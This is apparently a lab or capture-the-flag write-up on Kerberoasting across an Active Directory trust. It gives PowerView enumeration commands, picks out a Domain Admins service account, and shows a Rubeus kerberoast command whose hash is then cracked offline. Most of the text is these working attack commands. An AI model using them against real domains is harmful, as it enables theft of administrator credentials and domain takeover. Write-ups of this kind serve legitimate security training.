# Content

- [Content](#content)
  - [Question 1](#question-1)
    - [The way to hack](#the-way-to-hack)
    - [Answer](#answer)
  
## Question 1

### The way to hack

- We will enumerating accounts for associated SPNs using Get-DomainUser.
- Payload:
  - Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
  ![Picture](../../Image/Breaking%20Down%20Boundaries/1.png)
- We see that there is one account with an SPN in the target domain. A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.
- We will enumerating the mssqlsvc account.
- Payload:
  - Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
  ![Picture](../../Image/Breaking%20Down%20Boundaries/2.png)
- Now we perform a Kerberoasting Attacking with Rubeus using /domain Flag.
- Payload: 
    `.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`
    ![Picture](../../Image/Breaking%20Down%20Boundaries/3.png)
- Now we copy the hash into the terminal of linux and crack it.
  ![Picture](../../Image/Breaking%20Down%20Boundaries/4.png)
  ![Picture](../../Image/Breaking%20Down%20Boundaries/5.png)
  
### Answer

![Picture](../../Image/Breaking%20Down%20Boundaries/6.png)

